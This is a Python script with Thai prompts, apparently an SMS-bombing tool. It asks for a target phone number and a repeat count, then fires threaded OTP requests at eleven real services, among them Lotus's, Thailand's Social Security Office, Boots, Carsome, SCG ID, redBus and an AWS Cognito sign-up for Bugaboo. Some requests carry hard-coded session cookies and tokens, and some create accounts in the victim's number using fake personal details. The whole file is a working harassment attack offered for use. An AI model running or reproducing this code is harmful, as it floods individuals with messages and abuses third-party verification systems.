import requests
import time
import os
import threading
from threading import Thread

os.system('clear')
print ("")
print ("FB : โด้' คุง'ง")
print ("ทดลองได้")
print ("")
phone = input("เบอร์📱 : ")
NUM = int(input("จำนวน📲 : "))

print ("กำลังยิงอย่ารีบ....")
print ("")

def api():
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	print ("ยิงแล้วครับ : LOTUSS")

def api2():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print ("ยิงแล้วครับ : END")

def api3():
	requests.post("https://tamjaibet.com/api/request/otp", data={"phoneNumber": "0"+phone,"token":"HFdjc3ZU4WAnxLQQcCWB0TWV9zPCdpWmFpCUApNUtwAENbCGJkEAR9ckcdc20XMFR8HVQhEkREXwIOcDwnKRl1LDpXaQMJYB8ZSBQzZRdpem4YF3VHST0BYVQTU1NEcQATSSgpOnY3ZS9ZAFw3WSZXASwecS4LZD5wWhRicklxFQ1cFVAiczQOYxYSfUkaTD1sSSFTZU0mRDoZciRkEHV9dTE"})
	print ("ยิงแล้วครับ : MOVDIER")

def api4():
	requests.post("https://store.boots.co.th/api/v1/guest/register/otp-challenge",json={"phone_number": "+66"+phone})
	print ("ยิงแล้วครับ : BOOT")

def api5():
	requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":"phone","optType":0})
	print ("ยิงแล้วครับ : PYTHON2")

def api6():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print ("ยิงแล้วครับ : JAVA")

def api7():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print ("ยิงแล้วครับ : PHP")

def api8():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print ("ยิงแล้วครับ : NODE")

def api9():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print ("ยิงแล้วครับ : HTML")

def api10():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print ("ยิงแล้วครับ : C+")

def api11():
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	print ("ยิงแล้วครับ : LOTUSS")





for i in range(NUM):
	threading.Thread(target=api).start()
	threading.Thread(target=api2).start()
	threading.Thread(target=api3).start()
	threading.Thread(target=api4).start()
	threading.Thread(target=api5).start()
	threading.Thread(target=api6).start()
	threading.Thread(target=api7).start()
	threading.Thread(target=api8).start()
	threading.Thread(target=api9).start()
	threading.Thread(target=api10).start()
	threading.Thread(target=api11).start()
